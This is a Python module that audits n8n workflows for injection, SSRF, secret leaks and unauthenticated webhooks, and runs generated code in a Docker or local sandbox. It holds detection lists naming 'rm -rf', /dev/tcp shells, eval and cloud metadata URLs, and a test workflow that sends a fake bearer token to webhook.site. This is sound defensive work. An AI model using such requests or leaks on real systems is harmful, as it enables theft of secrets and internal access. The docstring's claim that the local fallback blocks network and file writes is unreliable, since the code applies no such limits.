"""Adversarial Red-Team & Execution-Guided Coding Sandbox.

Module 2 & 3:
- CyberSecRedTeamAgent: 4 attack vectors (command/prompt injection, SSRF,
  secret exfiltration, OWASP API auth) — runs these as inner attacks on the
  workflow BEFORE the deterministic SecurityGate.
- ExecutionSandbox: runs Python/JS snippets in an ephemeral Docker container
  with --net=none --read-only + strict memory/cpu limits, parses exit code /
  traceback, and supports self-heal retries. Docker is optional: when it is
  not present, a restricted local subprocess fallback is used.
"""

from __future__ import annotations

import json
import re
import subprocess
import tempfile
import os
from dataclasses import dataclass
from typing import Any, Optional


# ---------------------------------------------------------------------------
# Module 2: Adversarial Red-Team Agent
# ---------------------------------------------------------------------------

@dataclass
class RedTeamFinding:
    vector: str            # injection / ssrf / secrets / api_auth
    severity: int          # 0-10
    detail: str
    rule: str


class CyberSecRedTeamAgent:
    """Simulates an ethical-hacker attack on the generated artifact."""

    # 1. Command & prompt injection
    # 2. SSRF
    SSRF_PATTERNS = [
        r"https?://(127\.0\.0\.1|localhost|0\.0\.0\.0)(:\d+)?(/|)",
        r"https?://192\.168\.\d+\.\d+(:\d+)?(/|)",
        r"https?://10\.\d+\.\d+\.\d+(:\d+)?(/|)",
        r"https?://172\.(1[6-9]|2\d|3[01])\.\d+\.\d+(:\d+)?(/|)",
        r"https?://169\.254\.169\.254",   # AWS metadata
        r"https?://metadata\.google\.internal",
    ]

    # 3. Secret exfiltration
    SECRET_PATTERNS = [
        r"\bsk-[A-Za-z0-9]\S{20,}\b",
        r"\bghp_[A-Za-z0-9]{30,}\b",
        r"\bBearer\s+[A-Za-z0-9._~+/=-]{20,}\b",
        r"\bAKIA[0-9A-Z]{16}\b",
        r'\b[A-Z0-9_]{0,20}?_?(API_KEY|SECRET|TOKEN|PASSWORD)\b\s*=\s*["\'][^"\']{6,}["\']',
    ]

    def _check_vector(self, text: str, patterns: list[str], vector: str,
                      rule: str, severity: int) -> list[RedTeamFinding]:
        findings = []
        for p in patterns:
            if p and re.search(p, text, re.IGNORECASE):
                findings.append(
                    RedTeamFinding(vector=vector, severity=severity,
                                   detail=f"matched rule [{rule or p}]", rule=rule or p))
        return findings

    def __init__(self) -> None:
        self.INJECTION_PATTERNS = [
            r"\brm\s+-rf\b",
            r"(\/dev\/tcp\/|\/dev\/udp\/)",
            r"\beval\s*\(|\bexec\s*\(|\bchild_process\.",
            r"\bos\.system\s*\(|\bsubprocess\.(check_call|call)\s*\(",
            r"\b__import__\s*\(",
            r"\$fromAI\b",
        ]

    def audit_workflow(self, workflow: dict[str, Any]) -> dict[str, Any]:
        """Red-team a full n8n workflow object. Returns findings + summary."""
        findings: list[RedTeamFinding] = []

        def walk(node: dict[str, Any]):
            params = node.get("parameters", {})
            blob = json.dumps(node, default=str).lower()
            ntype = node.get("type", "")
            name = node.get("name") or ntype.split(".")[-1]

            # vector 1: injection in code nodes
            if "code" in ntype.lower():
                code = params.get("jsCode", "") or params.get("pythonCode", "") or ""
                findings.extend(self._check_vector(code, self.INJECTION_PATTERNS,
                                                   "injection", f"{name}: code-node", 9))

            # expand nested dict/list to string for generic checks
            def flatten(o: Any) -> str:
                if isinstance(o, dict):
                    return " ".join(flatten(v) for v in o.values())
                if isinstance(o, list):
                    return " ".join(flatten(v) for v in o)
                return str(o)

            flat = flatten(params)

            # vector 2: SSRF on HTTP nodes only (not on callers)
            if "httpRequest" in ntype:
                url = params.get("url", "")
                findings.extend(self._check_vector(url, self.SSRF_PATTERNS,
                                                   "ssrf", f"{name}: httpRequest->url", 8))
            elif "httpRequestTool" in ntype:
                url = params.get("url", "")
                findings.extend(self._check_vector(url, self.SSRF_PATTERNS,
                                                   "ssrf", f"{name}: tool->url", 8))

            # vector 3: secrets anywhere in params
            findings.extend(self._check_vector(flat, self.SECRET_PATTERNS,
                                               "exfiltration", f"{name}: params", 10))

            # vector 4: OWASP API — unauth'd webhook with sensitive verb, no auth creds
            if "webhook" in ntype and not node.get("authentication"):
                http_method = params.get("httpMethod", "POST")
                if http_method in ("PUT", "DELETE", "PATCH"):
                    findings.append(RedTeamFinding(
                        vector="api_auth", severity=7,
                        detail=f"{name}: unauth'd webhook {http_method} mutates data",
                        rule="OWASP API1-5 unauthorized"))

        for node in workflow.get("nodes", []):
            walk(node)
        return self._summarize(findings)

    def audit_text(self, content: Any) -> dict[str, Any]:
        """Red-team a raw blob (JSON string, code, config)."""
        text = content if isinstance(content, str) else json.dumps(content, default=str)
        findings = []
        findings.extend(self._check_vector(text, self.INJECTION_PATTERNS, "injection", "text-eval", 9))
        findings.extend(self._check_vector(text, self.SSRF_PATTERNS, "ssrf", "text-ssrf", 8))
        findings.extend(self._check_vector(text, self.SECRET_PATTERNS, "exfiltration", "text-secret", 10))
        return self._summarize(findings)

    @staticmethod
    def _summarize(findings: list[RedTeamFinding]) -> dict[str, Any]:
        findings.sort(key=lambda f: -f.severity)
        return {
            "red_team_passed": len(findings) == 0,
            "vulnerabilities": [f.detail for f in findings],
            "vectors": sorted({f.vector for f in findings}),
            "max_severity": max((f.severity for f in findings), default=0),
            "_findings": findings,
        }


# ---------------------------------------------------------------------------
# Module 3: Execution-Guided Coding Sandbox
# ---------------------------------------------------------------------------

class ExecutionSandbox:
    """Runs generated code in a throw-away container. Docker-gated execution,
    local fallback otherwise."""

    DOCKER_IMAGE = "python:3.11-slim"

    def __init__(self, use_docker: Optional[bool] = None, timeout_sec: int = 5,
                 memory: str = "128m", cpus: str = "0.5", max_retries: int = 2):
        self.timeout_sec = timeout_sec
        self.memory = memory
        self.cpus = cpus
        self.max_retries = max_retries
        if use_docker is None:
            use_docker = self._docker_available()
        self.use_docker = use_docker

    @staticmethod
    def _docker_available() -> bool:
        try:
            r = subprocess.run(["docker", "version"], capture_output=True, timeout=3)
            return r.returncode == 0
        except Exception:
            return False

    def run_python(self, code: str) -> dict[str, Any]:
        if self.use_docker:
            return self._run_docker(code)
        return self._run_local_fallback(code)

    def _run_docker(self, code: str) -> dict[str, Any]:
        with tempfile.NamedTemporaryFile("w", suffix=".py", delete=False) as f:
            f.write(code)
            script = f.name
        img = self.DOCKER_IMAGE
        cmd = ["docker", "run", "--rm", "--network", "none", "--read-only",
               "--memory", self.memory, "--cpus", self.cpus,
               "-v", f"{script}:/tmp/run.py:ro", img, "python", "/tmp/run.py"]
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=self.timeout_sec)
            if r.returncode == 0:
                return {"success": True, "language": "python", "output": r.stdout.strip(),
                        "sandbox": "docker"}
            return {"success": False, "language": "python",
                    "error": (r.stderr or r.stdout).strip(), "sandbox": "docker",
                    "traceback": r.stderr.strip()}
        except subprocess.TimeoutExpired:
            return {"success": False, "sandbox": "docker",
                    "error": "Execution Timeout Exceeded (possible infinite loop) — killed"}
        finally:
            try:
                os.unlink(script)
            except OSError:
                pass

    def _run_local_fallback(self, code: str) -> dict[str, Any]:
        """Restricted local interpreter (no network, no filesystem writes to
        project). Used only when Docker is unavailable."""
        if not self.use_docker:
            try:
                r = subprocess.run(
                    ["python3", "-c", code], capture_output=True, text=True,
                    timeout=self.timeout_sec, cwd="/tmp",
                    env={k: v for k, v in os.environ.items()
                         if k not in ("SECRET_KEY", "OPENAI_API_KEY")})
                if r.returncode == 0:
                    return {"success": True, "language": "python", "output": r.stdout.strip(),
                            "sandbox": "local_fallback"}
                return {"success": False, "language": "python", "error": r.stderr.strip(),
                        "sandbox": "local_fallback", "traceback": r.stderr.strip()}
            except subprocess.TimeoutExpired:
                return {"success": False, "sandbox": "local_fallback",
                        "error": "Execution Timeout Exceeded (possible infinite loop) — killed"}
        return {"success": False, "error": "no python3 available"}

    def self_heal(self, code: str, retry_code: Optional[dict[str, str]] = None) -> dict[str, Any]:
        """Run; if traceback and retry variants provided, iterate up to max_retries."""
        attempt = code
        for i in range(self.max_retries + 1):
            res = self.run_python(attempt)
            if res.get("success"):
                return {"attempts": i + 1, **res}
            if retry_code:
                attempt = retry_code.get(f"retry_{i}", attempt)
        return {"attempts": self.max_retries + 1, "success": False, "error": res.get("error"),
                "traceback": res.get("traceback")}


def save_code_nodes_runtime_check(workflow: dict[str, Any], sandbox: Optional[ExecutionSandbox] = None) -> list[dict[str, Any]]:
    """Convenience: run every Code node's JS in a node runtime check (JS not
    yet sandboxed — Python only). Returns per-node results."""
    sandbox = sandbox or ExecutionSandbox(use_docker=False)
    results = []
    for node in workflow.get("nodes", []):
        if "code" in node.get("type", "").lower():
            code = node.get("parameters", {}).get("pythonCode") or node.get("parameters", {}).get("jsCode")
            if code and "pythonCode" in node.get("parameters", {}):
                results.append({"node": node.get("name"), **sandbox.run_python(code)})
            else:
                results.append({"node": node.get("name"), "skipped": "js runtime check not wired",
                                "success": True})
    return results


# ---------------------------------------------------------------------------
# Example
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    rt = CyberSecRedTeamAgent()
    malicious = {
        "nodes": [
            {"name": "Bad", "type": "n8n-nodes-base.code", "parameters": {"jsCode": "eval(String.fromCharCode(98));"}},
            {"name": "SSRF", "type": "n8n-nodes-base.httpRequest",
             "parameters": {"url": "http://127.0.0.1:5678/rest/config"}},
            {"name": "Leak", "type": "n8n-nodes-base.httpRequest",
             "parameters": {"url": "https://webhook.site/x", "headerParameters":
                 {"parameters": [{"name": "Authorization", "value": "Bearer sk-proj-abcdefghijklmnopqrstuvwxyz123456789"}]}}},
            {"name": "MutWebhook", "type": "n8n-nodes-base.webhook",
             "parameters": {"httpMethod": "DELETE"}},
        ]
    }
    report = rt.audit_workflow(malicious)
    print(json.dumps({k: v for k, v in report.items()
                      if k != "_findings"}, indent=2, ensure_ascii=False))